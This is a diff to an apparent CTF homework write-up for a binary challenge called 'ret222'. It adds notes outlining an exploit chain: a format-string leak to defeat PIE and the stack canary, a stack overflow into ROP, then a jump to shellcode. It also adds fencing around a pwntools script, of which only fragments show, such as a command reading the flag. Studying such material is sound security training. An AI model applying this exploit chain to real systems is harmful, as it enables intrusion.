@@ -1,3 +1,11 @@
+# HW0
+## ret222 150
+* `Fmt` to leak `PIE base` and `Canary`, then we already bypass the `PIE` and `SSP`.
+* Stack overflow to do `ROP`.
+* ROP do the things that read more bytes to `name[16]`.
+* Jump to name -> Jump to shellcode.
+
+```python
 #!/usr/bin/env python2
 # -*- coding: ascii -*-
 from pwn import *
@@ -92,4 +100,4 @@ y.sendline( 'cat /home/`whoami`/flag' )
 
 
 y.interactive()
-
+```
